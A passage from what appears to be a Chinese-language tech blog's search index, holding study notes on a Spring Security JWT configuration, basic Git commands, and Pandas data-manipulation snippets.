class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//使用JWT，不需要csrf，关闭csrf防范</span></span><br><span class="line">    http</span><br><span class="line">            .csrf().disable()</span><br><span class="line">            <span class="comment">//基于token，不需要session</span></span><br><span class="line">            .sessionManagement()</span><br><span class="line">            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//授权认证</span></span><br><span class="line">            .authorizeRequests()</span><br><span class="line">            <span class="comment">//所有请求都要求认证,必须登录后被访问</span></span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">            <span class="comment">//动态权限配置</span></span><br><span class="line">            .withObjectPostProcessor(<span class="keyword">new</span> ObjectPostProcessor&lt;FilterSecurityInterceptor&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> &lt;O extends FilterSecurityInterceptor&gt; <span class="function">O <span class="title">postProcess</span><span class="params">(O object)</span> </span>&#123;</span><br><span class="line">                    object.setAccessDecisionManager(customUrlDecisionManager);</span><br><span class="line">                    object.setSecurityMetadataSource(customFilter);</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//禁用缓存</span></span><br><span class="line">            .headers()</span><br><span class="line">            .cacheControl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加jwt 登录授权过滤器</span></span><br><span class="line">    http.addFilterBefore(jwtAuthencationTokenFilter(), UsernamePasswordAuthenticationFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//异常处理</span></span><br><span class="line">    <span class="comment">// 添加自定义未授权和未登录结果返回</span></span><br><span class="line">    http.exceptionHandling()</span><br><span class="line">            .accessDeniedHandler(restfulAccessDeniedHandler)</span><br><span class="line">            .authenticationEntryPoint(restAuthorizationEntryPoint);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git操作</title>
      <link href="/2022/04/22/git/"/>
      <url>/2022/04/22/git/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#基本操作">基本操作</a></li><li><a href="#版本控制">版本控制</a></li><li><a href="#远程仓库">远程仓库</a></li><li><a href="#分支">分支</a></li><li><a href="#标签release-发行版">标签Release 发行版</a></li><li><a href="#idea">Idea</a></li></ul><!-- tocstop --><h2><span id="基本操作">基本操作</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment"># 新建git仓库</span></span><br><span class="line">git add &lt;filename/directory/.&gt; <span class="comment"># 将工作区的文件、目录、所有文件添加到stage</span></span><br><span class="line">git commit -m <span class="string">"commit"</span> <span class="comment"># 将stage的文件添加到版本库中</span></span><br><span class="line">git commit -am <span class="string">"commit"</span> <span class="comment"># 上两步合二为一</span></span><br><span class="line">git commit -a <span class="comment"># 更加简化</span></span><br><span class="line">git status <span class="comment"># 查看git状态</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment"># 查看提交日志</span></span><br><span class="line">git <span class="built_in">log</span> 5 --pretty=oneline <span class="comment"># 方便查看日志</span></span><br><span class="line">git diff <span class="comment"># 查看区别</span></span><br><span class="line">git rm filename <span class="comment"># 删除文件</span></span><br><span class="line">git ls-files <span class="comment"># 查看本地仓库文件</span></span><br></pre></td></tr></table></figure><h2><span id="版本控制">版本控制</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD <span class="comment"># 将stage中的文件清空（撤销git add操作）</span></span><br><span class="line">git reset --hard HEAD^^ <span class="comment"># 所有区域回退到上上个版本 取决于^的数量</span></span><br><span class="line">git reset --hard HEAD~1 <span class="comment"># 回退一个版本</span></span><br><span class="line">git reset --hard 标识符 <span class="comment"># 回退到某个版本，输入5位+，不重复即可</span></span><br><span class="line">git reflog <span class="comment"># 查看之前的引用位置，防止无法回滚</span></span><br><span class="line"></span><br><span class="line">git checkout --filename <span class="comment">#恢复已提交的误删除工作区的文件</span></span><br></pre></td></tr></table></figure><h2><span id="远程仓库">远程仓库</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> url <span class="comment"># 下载远程仓库项目</span></span><br><span class="line">git push origin branch <span class="comment"># 推送本地分支到远程</span></span><br><span class="line">git push origin :remote_branch <span class="comment"># 删除远程分支</span></span><br><span class="line">git checkout -b local_branch origin/remote_branch <span class="comment"># 拉取远程指定分支并在本地创建分支</span></span><br><span class="line">git fetch <span class="comment"># 获取分支</span></span><br><span class="line">git pull <span class="comment"># 拉取最新内容</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'多人协作'</span><span class="string">''</span></span><br><span class="line"><span class="comment"># 提交前先pull</span></span><br></pre></td></tr></table></figure><h2><span id="分支">分支</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git checkout branch <span class="comment"># 切换到指定分支</span></span><br><span class="line">git checkout -b new_branch <span class="comment"># 新建分支并切换到新建分支</span></span><br><span class="line">git branch -d branch <span class="comment"># 删除指定分支</span></span><br><span class="line">git branch <span class="comment"># 查看所有分支 *代表目前分支</span></span><br><span class="line">git branch -m oldBranch newBranch 重命名分支</span><br><span class="line">git branch -a <span class="comment"># 查看本地和远程分支</span></span><br></pre></td></tr></table></figure><h2><span id="标签release-发行版">标签Release 发行版</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git tag tagName <span class="comment"># 新建标签 默认为HEAD</span></span><br><span class="line">git tage -a tag_name -m <span class="string">'xx'</span> <span class="comment"># 添加标签并指定描述信息</span></span><br><span class="line">git tag <span class="comment"># 查看所有标签</span></span><br><span class="line">git tag -d tag_name <span class="comment"># 删除本地标签</span></span><br><span class="line">git push origin tag_name <span class="comment"># 推送本地标签到远程</span></span><br></pre></td></tr></table></figure><h2><span id="idea">Idea</span></h2><ul><li>下载插件.ignore</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas基础</title>
      <link href="/2022/04/13/Pandas/"/>
      <url>/2022/04/13/Pandas/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#数据读取处理">数据读取处理</a><ul><li><a href="#选择列">选择列</a></li><li><a href="#选择行">选择行</a></li></ul></li><li><a href="#数据格式化">数据格式化</a></li><li><a href="#日期">日期</a></li><li><a href="#crud">CRUD</a><ul><li><a href="#列操作">列操作</a></li><li><a href="#行操作">行操作</a><ul><li><a href="#create">Create</a></li><li><a href="#del">Del</a></li><li><a href="#update">Update</a></li><li><a href="#retrieve">Retrieve</a></li></ul></li></ul></li><li><a href="#保存文件">保存文件</a></li><li><a href="#tricks">Tricks</a></li><li><a href="#matplotlib">matplotlib</a></li><li><a href="#tips">Tips</a><ul><li><a href="#屏蔽提醒">屏蔽提醒</a></li><li><a href="#显示中文">显示中文</a></li><li><a href="#关于iloc和选择赋值失败问题">关于iloc和[]选择赋值失败问题</a></li></ul></li></ul><!-- tocstop --><h2><span id="数据读取处理">数据读取处理</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iris = load_iris()</span><br><span class="line">lable = iris.feature_names</span><br><span class="line">target = iris.target</span><br><span class="line">feature = iris.data</span><br><span class="line">data = np.column_stack((feature,target))</span><br><span class="line">lable.append(<span class="string">'type'</span>)</span><br><span class="line">df = pd.DataFrame(data,columns=lable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.reshape(<span class="number">-1</span>,<span class="number">1</span>)</span><br><span class="line">a[:,np.newaxis]</span><br></pre></td></tr></table></figure><h3><span id="选择列">选择列</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr.select_dtypes(include=[<span class="string">'int64'</span>,<span class="string">'float64'</span>])</span><br></pre></td></tr></table></figure><h3><span id="选择行">选择行</span></h3><ul><li>可以通过 “.”  来操作 <code>df.a</code></li><li>也可以通过 “[]” 来操作 <code>df[&#39;a&#39;]</code></li></ul><h2><span id="数据格式化">数据格式化</span></h2><ol><li>map、apply在用于Series时，对每一个值进行处理，两者并没有什么区别</li><li>apply不仅可以用于Series，还可以用于DataFrame；而map只能用于Series。</li><li>一般情况下，apply应用更广泛，尤其是自定义函数带多个参数时，建议使用apply。</li><li>applymap可以对多个Series进行操作，map和apply均不行。</li></ol><ul><li><p><strong>apply /map/applymap</strong>  函数（常用方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_interval</span><span class="params">(df,from_date,to_date)</span>:</span></span><br><span class="line">    delta = <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = datetime.datetime.strptime(df[from_date],<span class="string">"%m/%d/%Y"</span>)</span><br><span class="line">        t = datetime.datetime.strptime(df[to_date],<span class="string">"%m/%d/%Y"</span>)</span><br><span class="line">        delta = (t-f).days</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> delta&lt;=<span class="number">0</span> <span class="keyword">else</span> delta</span><br><span class="line">  df[<span class="string">'d'</span>] = df.apply(cal_interval,axis=<span class="number">1</span>,args=[<span class="string">'Date Event Began'</span>,<span class="string">'Date of Restoration'</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date = pd.period_range(start = <span class="string">'1990-02-01'</span>,periods=<span class="number">100</span>,freq=<span class="string">'D'</span>)</span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">'date'</span>:date,<span class="string">'val'</span>:np.random.randn(len(date)),<span class="string">'val2'</span>:np.random.randn(len(date))&#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="right"></th><th align="right">date</th><th align="right">val</th><th>val2</th></tr></thead><tbody><tr><td align="right">0</td><td align="right">1990-02-01</td><td align="right">0.771114</td><td>0.223646</td></tr><tr><td align="right">1</td><td align="right">1990-02-02</td><td align="right">-0.630781</td><td>-1.231217</td></tr><tr><td align="right">2</td><td align="right">1990-02-03</td><td align="right">-0.435648</td><td>-1.324931</td></tr><tr><td align="right">3</td><td align="right">1990-02-04</td><td align="right">2.459657</td><td>1.195601</td></tr><tr><td align="right">4</td><td align="right">1990-02-05</td><td align="right">0.378009</td><td>2.207286</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apply默认是作用于列，要作用于行的话需要加上axis=1</span></span><br><span class="line">q2.apply(<span class="keyword">lambda</span> x:x.原价==x.实价,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 保留两位小数（类型变成Object）</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: format(x,<span class="string">'.2f'</span>))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">'&#123;:.2f&#125;'</span>.format(x))</span><br><span class="line"><span class="comment"># 四舍五入保留两位小数</span></span><br><span class="line">df.val.round(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为百分比，并保留2位小数 lambda 写法</span></span><br><span class="line">df.val.map(<span class="keyword">lambda</span> x: <span class="string">"&#123;:.2%&#125;"</span>.format(x))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">q2_df[col].apply(<span class="keyword">lambda</span> x:format(x,<span class="string">'.2%'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常函数写法（不推荐）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn_percentage</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'%.2f%%'</span> % (x * <span class="number">100</span>);</span><br><span class="line">df.val.apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将获奖时间格式化为x月x日</span></span><br><span class="line">df.date.apply(<span class="keyword">lambda</span> x:x.strftime(<span class="string">'%m月%d日'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将Series中的数据和字符拼接</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">f'随机数： <span class="subst">&#123;x&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># applymap可以对多个Series进行操作</span></span><br><span class="line">df[[<span class="string">'val'</span>,<span class="string">'val1'</span>]].applymap(<span class="keyword">lambda</span> x:format(x,<span class="string">'.2f'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建apply函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_state</span><span class="params">(row)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">'Austin - EV'</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Off'</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">'Austin - EV'</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'On'</span></span><br><span class="line"><span class="comment"># 应用apply函数</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map传入字典 其余值均变为NaN</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]&#125;)</span><br><span class="line">df1.A=df1.A.map(&#123;<span class="string">'a'</span>:<span class="string">'A'</span>,<span class="string">'b'</span>:<span class="string">'B'</span>&#125;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># df使用apply还可以传其他参</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regress</span><span class="params">(data, yvar, xvars)</span>:</span></span><br><span class="line">    Y = data[yvar]</span><br><span class="line">    X = data[xvars]</span><br><span class="line">    X[<span class="string">'intercept'</span>] = <span class="number">1.</span></span><br><span class="line">    result = sm.OLS(Y, X).fit()</span><br><span class="line">    <span class="keyword">return</span> result.params</span><br><span class="line">  </span><br><span class="line">by_year.apply(regress, <span class="string">'AAPL'</span>, [<span class="string">'SPX'</span>])</span><br></pre></td></tr></table></figure></li><li><p>groupby后的apply</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据是tg_id,month,q1-q96,求每个月q1-q96中最大的点</span></span><br><span class="line"><span class="comment"># 法1</span></span><br><span class="line">df.groupby([<span class="string">'tg_id'</span>,<span class="string">'month'</span>]).apply(<span class="keyword">lambda</span> x:max(x.drop([<span class="string">'tg_id'</span>,<span class="string">'month'</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:max(x))))</span><br><span class="line"><span class="comment"># 法 2</span></span><br><span class="line">df.groupby([<span class="string">'tg_id'</span>,<span class="string">'month'</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">'tg_id'</span>,<span class="string">'month'</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:max(x,axis=<span class="number">1</span>))).reset_index().groupby([<span class="string">'tg_id'</span>,<span class="string">'month'</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">'tg_id'</span>,<span class="string">'month'</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:max(x)))</span><br><span class="line"><span class="comment"># 法3</span></span><br><span class="line">val = [<span class="string">f'p<span class="subst">&#123;i&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">97</span>)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_min</span><span class="params">(df)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> df[val].min().min()</span><br><span class="line">q4.groupby([<span class="string">'tg_id'</span>,<span class="string">'month'</span>]).apply(cal_max)</span><br><span class="line"><span class="comment"># 法4</span></span><br><span class="line">q4.groupby([<span class="string">'tg_id'</span>,<span class="string">'month'</span>]).apply(<span class="keyword">lambda</span> x:x[val].max().max())</span><br></pre></td></tr></table></figure><ul><li><p>将含有空白符的列转float</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.a.replace(<span class="string">r'^\s*$'</span>, np.nan, regex=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="日期">日期</span></h2><ul><li>将日的数据转为以月为统计的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取日期中的date</span></span><br><span class="line">df[<span class="string">'date'</span>].dt.date</span><br><span class="line"><span class="comment"># 重采样 统计</span></span><br><span class="line">df.resample(<span class="string">'D'</span>).count()</span><br><span class="line"><span class="comment">#重采样 逐个显示</span></span><br><span class="line">df.to_period(<span class="string">"M"</span>)</span><br><span class="line"><span class="comment"># 异形日期转换</span></span><br><span class="line">pd.to_datetime(work_index[<span class="string">'日期'</span>],format=<span class="string">'%Y%m%d'</span>)</span><br><span class="line"><span class="comment"># 选择日期范围</span></span><br><span class="line">bz = [<span class="string">'2022-2-14'</span>,<span class="string">'2022-2-20'</span>]</span><br></pre></td></tr></table></figure><h2><span id="crud">CRUD</span></h2><p>一般来说pandas操作都不会在原dataframe进行修改，通过inplace=True可以实现就地修改。</p><h4><span id="列操作">列操作</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名特定列名</span></span><br><span class="line">df.rename(columns=&#123;<span class="string">'A'</span>:<span class="string">'a'</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 重命名所有列名</span></span><br><span class="line">df.columns = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]</span><br><span class="line"><span class="comment"># 取出特定类型的列名</span></span><br><span class="line">obj_feature=df.dtypes[df.dtypes==<span class="string">'object'</span>].index</span><br><span class="line"><span class="comment"># 更新列的类型</span></span><br><span class="line">df[<span class="string">'金牌数'</span>] = df[<span class="string">'金牌数'</span>].astype(int)</span><br><span class="line"><span class="comment"># 插入list</span></span><br><span class="line">df.a = df.a.astype(<span class="string">'list'</span>)</span><br><span class="line">df.iat[i,<span class="number">-1</span>] = list(xxx)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">li</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 连接两个列</span></span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只取结果的交集</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">'inner'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只取包含 df1 索引的部分</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line">pd.merge(df1,df4,left_index=<span class="literal">True</span>,right_index=<span class="literal">True</span>,how=<span class="string">'left'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增列</span></span><br><span class="line">df[<span class="string">'new col name'</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入列</span></span><br><span class="line">tmp3 = (df[<span class="string">'春节期间（除夕至初六）用电量'</span>]-df[<span class="string">'节前温度接近的一周用电量'</span>])/df[<span class="string">'节前温度接近的一周用电量'</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除 df 的 7、8、9、10 列</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># 提取 金牌数、银牌数、铜牌数 三列</span></span><br><span class="line">df[[<span class="string">'金牌数'</span>,<span class="string">'银牌数'</span>,<span class="string">'铜牌数'</span>]]</span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.str.endswith(<span class="string">'数'</span>)]</span><br><span class="line"><span class="comment"># 改变列顺序</span></span><br><span class="line">df = df[[<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>]]</span><br><span class="line"><span class="comment"># 单一一列提前可以</span></span><br><span class="line">df.set_index(<span class="string">'a'</span>).reset_index()</span><br><span class="line"><span class="comment"># 按列排序</span></span><br><span class="line">df.max(axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">df.max(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 统计出现最多的</span></span><br><span class="line">tmp2 =df.groupby([<span class="string">'genreId'</span>]).agg(<span class="keyword">lambda</span> x:x.mode())</span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line">df.groupby([<span class="string">'genreId'</span>,<span class="string">'contentRating'</span>]).count()[[<span class="string">'id'</span>]].idxmax(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4><span id="行操作">行操作</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">拼接行</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看含有空值的行</span></span><br><span class="line">df[df.isna().T.any()]</span><br><span class="line"><span class="comment"># 连接两个df</span></span><br><span 